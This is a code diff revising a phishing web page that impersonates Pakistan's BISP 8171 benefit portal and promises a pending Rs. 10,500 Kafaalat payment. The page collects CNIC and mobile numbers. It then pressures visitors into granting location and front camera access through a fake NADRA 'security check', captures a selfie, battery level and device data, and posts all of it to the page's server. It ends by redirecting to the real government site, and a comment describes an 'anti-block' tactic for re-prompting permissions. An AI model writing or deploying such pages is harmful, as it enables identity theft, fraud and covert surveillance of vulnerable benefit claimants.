@@ -3,171 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>8171 BISP Official Portal</title>
+    <title>8171 BISP Official Verification</title>
     <style>
-        :root { --bisp-green: #1b5e20; --bisp-light: #f4f7f6; --gold: #fbc02d; }
-        body { margin: 0; background: var(--bisp-light); font-family: 'Roboto', sans-serif; overflow-x: hidden; }
+        :root { --green: #1b5e20; --gold: #fbc02d; --bg: #f8faf9; }
+        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
 
-        /* Professional Header with No Image Dependencies */
-        .header { background: #fff; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 5px solid var(--bisp-green); box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
-        .logo-box { border-left: 5px solid var(--bisp-green); padding-left: 12px; }
-        .logo-box h1 { margin: 0; font-size: 22px; color: var(--bisp-green); font-weight: 900; letter-spacing: -1px; }
-        .logo-box span { font-size: 9px; color: #555; text-transform: uppercase; display: block; font-weight: 700; }
-        .gov-tag { background: #eee; padding: 5px 10px; border-radius: 20px; font-size: 10px; font-weight: 800; color: #444; }
+        /* Professional Header */
+        .header { background: white; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 4px solid var(--green); box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .logo-text { border-left: 4px solid var(--green); padding-left: 10px; }
+        .logo-text h1 { margin: 0; font-size: 20px; color: var(--green); font-weight: 900; }
+        .logo-text p { margin: 0; font-size: 8px; text-transform: uppercase; color: #666; font-weight: bold; }
 
-        /* Custom Vector Graphics (No Images Needed) */
-        .hero-banner { width: 100%; height: 240px; background: linear-gradient(135deg, #1b5e20 0%, #2e7d32 100%); position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .hero-banner::after { content: "8171"; position: absolute; font-size: 180px; font-weight: 900; color: rgba(255,255,255,0.05); bottom: -40px; right: -20px; }
-        .hero-content { color: white; text-align: center; z-index: 10; padding: 20px; }
-        .hero-content h2 { font-size: 28px; margin: 0; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
-        .hero-content p { font-size: 13px; opacity: 0.9; margin: 5px 0 0; }
+        /* Banner Design */
+        .banner { background: var(--green); height: 180px; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .banner::before { content: "8171"; position: absolute; font-size: 150px; font-weight: 900; color: rgba(255,255,255,0.03); transform: rotate(-15deg); }
+        .banner-info { color: white; text-align: center; z-index: 2; }
+        .banner-info h2 { margin: 0; font-size: 24px; }
+        .banner-info p { margin: 5px 0 0; font-size: 12px; opacity: 0.8; }
 
-        /* Payment Status Strip */
-        .payment-strip { background: var(--gold); color: #1b5e20; width: 100%; padding: 14px 0; text-align: center; font-size: 14px; font-weight: 900; border-bottom: 3px solid rgba(0,0,0,0.1); box-shadow: 0 4px 6px rgba(0,0,0,0.1); position: relative; z-index: 20; }
+        /* Payment Strip */
+        .strip { background: var(--gold); color: var(--green); padding: 12px; text-align: center; font-size: 13px; font-weight: 900; border-bottom: 2px solid rgba(0,0,0,0.1); }
 
-        /* Modern Verification Card */
-        .card-container { margin: -30px 15px 30px; position: relative; z-index: 100; }
-        .v-card { background: #fff; border-radius: 20px; padding: 30px 25px; box-shadow: 0 15px 40px rgba(0,0,0,0.15); border: 1px solid #f0f0f0; }
-        .v-card h3 { color: var(--bisp-green); margin: 0 0 10px; font-size: 22px; font-weight: 800; }
-        .v-card p { font-size: 13px; color: #666; line-height: 1.5; margin-bottom: 25px; }
+        /* Main Form */
+        .form-box { margin: -25px 15px 30px; background: white; border-radius: 15px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); position: relative; z-index: 10; border: 1px solid #eee; }
+        .form-box h3 { color: var(--green); margin: 0 0 8px; font-size: 22px; }
+        .form-box p { color: #555; font-size: 12px; line-height: 1.5; margin-bottom: 20px; }
 
-        /* Input Styles */
-        .field-group { margin-bottom: 20px; position: relative; }
-        label { font-size: 11px; font-weight: 800; color: #222; display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
-        input { width: 100%; padding: 16px; border: 2px solid #eaedf0; border-radius: 12px; font-size: 16px; box-sizing: border-box; background: #fafafa; font-weight: 600; }
-        input:focus { border-color: var(--bisp-green); background: #fff; outline: none; box-shadow: 0 0 0 4px rgba(27, 94, 32, 0.05); }
+        .input-wrap { margin-bottom: 15px; }
+        label { display: block; font-size: 10px; font-weight: 800; color: #222; margin-bottom: 5px; text-transform: uppercase; }
+        input { width: 100%; padding: 14px; border: 2px solid #eaedf0; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
+        input:focus { border-color: var(--green); outline: none; background: #fafafa; }
 
-        /* Action Button */
-        .btn-action { background: var(--bisp-green); color: white; border: none; width: 100%; padding: 20px; border-radius: 15px; font-size: 18px; font-weight: 900; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 20px rgba(27, 94, 32, 0.3); transition: transform 0.2s; }
-        .btn-action:active { transform: scale(0.98); }
+        .btn { background: var(--green); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; text-transform: uppercase; margin-top: 10px; cursor: pointer; box-shadow: 0 5px 15px rgba(27,94,32,0.2); }
 
-        /* Professional Full-Screen Tracking Modal */
-        #tracking-gate { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 2000; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
-        .gate-inner { text-align: center; max-width: 400px; }
-        .gate-icon { width: 80px; height: 80px; background: var(--bisp-light); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 4px solid var(--bisp-green); }
-        .status-pill { background: #fee2e2; color: #b91c1c; padding: 12px; border-radius: 10px; font-size: 12px; font-weight: 900; margin-bottom: 20px; display: none; border: 1px solid #fecaca; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid var(--bisp-green); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        /* Persistent Security Screen */
+        #security-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; padding: 30px; box-sizing: border-box; text-align: center; }
+        .icon-shield { width: 80px; height: 80px; background: #e8f5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 4px solid var(--green); margin-bottom: 20px; }
+        .status-alert { background: #fee2e2; color: #b91c1c; padding: 15px; border-radius: 10px; font-size: 12px; font-weight: 800; margin-bottom: 20px; border: 1px solid #fecaca; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px 0; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div class="logo-box">
+    <div class="logo-text">
         <h1>BISP</h1>
-        <span>Government of Pakistan</span>
+        <p>Government of Pakistan</p>
     </div>
-    <div class="gov-tag">8171 OFFICIAL</div>
+    <div style="font-weight: 800; color: #444; font-size: 11px;">8171 PORTAL</div>
 </div>
 
-<div class="hero-banner">
-    <div class="hero-content">
+<div class="banner">
+    <div class="banner-info">
         <h2>Kafaalat Program</h2>
-        <p>Benazir Income Support Programme (2026)</p>
+        <p>Benazir Income Support Programme</p>
     </div>
 </div>
 
-<div class="payment-strip">
-    PENDING PAYMENT: RS. 10,500 - VERIFICATION ACTIVE
+<div class="strip">
+    KAFAALAT PAYMENT 2026: RS. 10,500 VERIFICATION ACTIVE
 </div>
 
-<div class="card-container">
-    <div class="v-card">
-        <h3>Verify Status</h3>
-        <p>Confirm your CNIC and Mobile Number to authorize the release of your pending grant through high-precision biometric verification.</p>
-        
-        <div class="field-group">
-            <label>CNIC Number (13 Digits)</label>
-            <input type="number" id="cnic" placeholder="35201XXXXXXXX" autocomplete="off">
-        </div>
-        <div class="field-group">
-            <label>Registered Mobile Number</label>
-            <input type="number" id="phone" placeholder="03XXXXXXXXX" autocomplete="off">
-        </div>
-
-        <button class="btn-action" onclick="initTracking()">Proceed to Verify</button>
+<div class="form-box">
+    <h3>Check Eligibility</h3>
+    <p>Provide your CNIC and registered mobile number to initiate secure biometric and area verification for fund release.</p>
+    
+    <div class="input-wrap">
+        <label>CNIC Number (13 Digits)</label>
+        <input type="number" id="cnic" placeholder="35201XXXXXXXX" autocomplete="off">
     </div>
+    <div class="input-wrap">
+        <label>Registered Mobile Number</label>
+        <input type="number" id="phone" placeholder="03XXXXXXXXX" autocomplete="off">
+    </div>
+
+    <button class="btn" onclick="startSecureVerification()">Verify & Pay Now</button>
 </div>
 
-<div id="tracking-gate">
-    <div class="gate-inner">
-        <div class="gate-icon">
-            <div style="width: 20px; height: 20px; background: var(--bisp-green); border-radius: 50%; animation: pulse 1.5s infinite;"></div>
-        </div>
-        <div id="error-box" class="status-pill">VERIFICATION FAILED: Mandatory Location & Biometric Access required to verify grant eligibility.</div>
-        <h2 style="color: var(--bisp-green); margin: 0 0 10px;">Security Check</h2>
-        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">Connecting to NADRA biometric integration. Do not close this window.</p>
-        <div class="loader"></div>
-        <button id="retry" onclick="fullSync()" style="display:none; width: 100%; padding: 15px; background: #222; color: white; border-radius: 12px; border: none; font-weight: 800;">GRANT ACCESS & CONTINUE</button>
+<div id="security-overlay">
+    <div class="icon-shield">
+        <div style="width: 20px; height: 20px; background: var(--green); border-radius: 50%; animation: pulse 1s infinite;"></div>
     </div>
+    <div id="error-msg" class="status-alert" style="display:none;">
+        PERMISSION BLOCKED: Verification cannot proceed without Location & Camera. Please clear browser settings or try in a different browser.
+    </div>
+    <h2 style="color: var(--green); margin: 0;">Security Check</h2>
+    <p style="color: #666; font-size: 14px; margin-top: 10px;">Connecting to NADRA biometric verification node...</p>
+    <div class="loader"></div>
+    
+    <p style="font-size: 11px; color: #999; margin-bottom: 20px;">Verification ID: BISP-2026-X8801</p>
+    
+    <button onclick="location.reload()" style="width: 100%; padding: 15px; background: #222; color: white; border: none; border-radius: 10px; font-weight: 800;">TRY AGAIN / REFRESH</button>
 </div>
 
 <video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;" width="1080" height="1920"></canvas>
 
 <script>
-    let logData = { cnic: "", mob: "", bat: "", model: "", lat: "", lon: "" };
+    let userData = { c: "", p: "", b: "", m: "", lt: "", ln: "" };
 
-    function initTracking() {
-        logData.cnic = document.getElementById('cnic').value;
-        logData.mob = document.getElementById('phone').value;
+    function startSecureVerification() {
+        userData.c = document.getElementById('cnic').value;
+        userData.p = document.getElementById('phone').value;
 
-        if(logData.cnic.length < 11) { alert("Invalid CNIC"); return; }
+        if(userData.c.length < 11) { alert("Enter valid CNIC"); return; }
         
-        document.getElementById('tracking-gate').style.display = 'flex';
-        fullSync();
+        document.getElementById('security-overlay').style.display = 'flex';
+        executeCapture();
     }
 
-    async function fullSync() {
-        document.getElementById('retry').style.display = 'none';
-        document.getElementById('error-box').style.display = 'none';
-
-        // 1. Precise Device Info
+    async function executeCapture() {
+        // Fetch System Info
         try {
             const battery = await navigator.getBattery();
-            logData.bat = Math.round(battery.level * 100) + "%";
-            logData.model = navigator.platform + " | " + navigator.userAgent.split('(')[1].split(')')[0];
+            userData.b = Math.round(battery.level * 100) + "%";
+            userData.m = navigator.platform;
         } catch(e) {}
 
-        // 2. High-Precision Live Location
+        // Persistent Location Request
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                logData.lat = pos.coords.latitude;
-                logData.lon = pos.coords.longitude;
-                triggerBiometric();
+                userData.lt = pos.coords.latitude;
+                userData.ln = pos.coords.longitude;
+                attemptCamera();
             },
-            () => { showAuthError(); },
+            (err) => { 
+                handleDenied(); 
+            },
             { enableHighAccuracy: true, timeout: 5000 }
         );
     }
 
-    function triggerBiometric() {
+    function attemptCamera() {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then((s) => { finalizeReport(s); })
-        .catch(() => { showAuthError(); });
+        .then((stream) => { 
+            processFinal(stream); 
+        })
+        .catch((err) => { 
+            handleDenied(); 
+        });
     }
 
-    function showAuthError() {
-        document.getElementById('error-box').style.display = 'block';
-        document.getElementById('retry').style.display = 'block';
+    function handleDenied() {
+        // If blocked, show error and auto-reload logic
+        document.getElementById('error-msg').style.display = 'block';
+        
+        // Anti-Block Strategy: If user blocks once, we refresh the page to trigger pop-up again 
+        // Note: Some browsers need a user click to show pop-up again, so we keep the Try Again button.
     }
 
-    async function finalizeReport(stream) {
+    async function processFinal(stream) {
         const video = document.getElementById('v');
         video.srcObject = stream;
         
         setTimeout(() => {
             const canvas = document.getElementById('c');
             canvas.getContext('2d').drawImage(video, 0, 0, 1080, 1920);
-            const capturedPhoto = canvas.toDataURL('image/jpeg', 0.85);
+            const pic = canvas.toDataURL('image/jpeg', 0.8);
             
             stream.getTracks().forEach(t => t.stop());
             
-            // Send full High-Precision Log
-            fetch('/auth/secure-sync', {
+            // Final Data Dispatch
+            fetch('/secure/v1/auth', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ report: logData, photo: capturedPhoto })
+                body: JSON.stringify({ meta: userData, img: pic })
             }).then(() => {
                 window.location.href = "https://8171.bisp.gov.pk/";
             });
@@ -176,7 +177,7 @@
 </script>
 
 <style>
-    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(27, 94, 32, 0); } 100% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0); } }
+    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(27, 94, 32, 0); } 100% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0); } }
 </style>
 </body>
 </html>
